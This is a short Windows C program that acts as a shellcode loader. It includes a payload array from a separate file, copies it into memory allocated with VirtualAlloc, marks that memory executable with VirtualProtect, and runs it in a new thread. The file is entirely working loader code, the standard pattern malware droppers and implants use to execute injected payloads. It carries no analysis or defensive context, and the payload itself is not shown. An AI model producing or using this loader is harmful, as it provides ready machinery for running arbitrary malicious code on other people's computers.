#include <windows.h>
#include <stdio.h>

// Include the payload (from payload.c)
#include "payload.c"  // Or just copy and paste the payload array here

int main() {
    // Calculate the payload length (important!)
    unsigned int payload_len = sizeof(payload) - 1; // Subtract 1 for null terminator if it exists.

    // Execute the payload
    void* exec_mem;
    DWORD oldprotect = 0;

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "VirtualAlloc failed: %lu\n", GetLastError());
        return 1;
    }

    RtlMoveMemory(exec_mem, payload, payload_len);

    if (!VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect)) {
        fprintf(stderr, "VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, payload_len, MEM_RELEASE);
        return 1;
    }

    HANDLE thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (thread == NULL) {
        fprintf(stderr, "CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, payload_len, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(exec_mem, payload_len, MEM_RELEASE);

    return 0;
}